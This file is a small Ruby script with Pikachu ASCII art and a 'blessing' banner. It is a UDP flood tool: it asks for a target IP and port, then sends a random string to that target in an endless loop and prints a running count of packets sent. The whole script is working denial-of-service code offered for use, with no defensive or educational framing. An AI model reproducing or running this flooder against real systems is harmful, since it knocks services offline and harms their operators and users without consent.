require 'socket'
begin
str = "<*> Ready for play."
puts '　　/＼7　　　 ∠＿/
　 /　│　　 ／　／
　│　Z ＿,＜　／　　 /`ヽ
　│　　　　　ヽ　　 /　　〉
　 Y　　　　　`　 /　　/
　ｲ●　､　●　　⊂⊃〈　　/
　()　 へ　　　　|　＼〈
　　>ｰ ､_　 ィ　 │ ／／
　 / へ　　 /　ﾉ＜| ＼＼
　 ヽ_ﾉ　　(_／　 │／／
　　7　　　　　　　|／
　　＞―r￣￣`ｰ―＿ '
puts "[!!!] Pikachu is blessing you!!!"
print "ip =>"
$ip = gets.chomp
print "port =>"
$port = gets.chomp
puts "[*] ip = #{$ip}"
puts "[*] port = #{$port}"
puts "====================FLOOD===================="
print str
a = 0
$connect = UDPSocket.new
(1..5).each do |i|
        print '.'
        sleep(1)
end
def send_s(text)
  begin
    $connect.send(text,0,$ip,$port)
  rescue
    @connect.close
    exit
  end
end
$a = 0
chars = ('a'..'z').to_a + ('A'..'Z').to_a
random = Array.new(6) {chars.sample}.join
while true
      send_s(random)
      $a +=1
      puts "+++Successfully sent #{$a} data packets+++ => #{$ip}:#{$port}"
    end
end
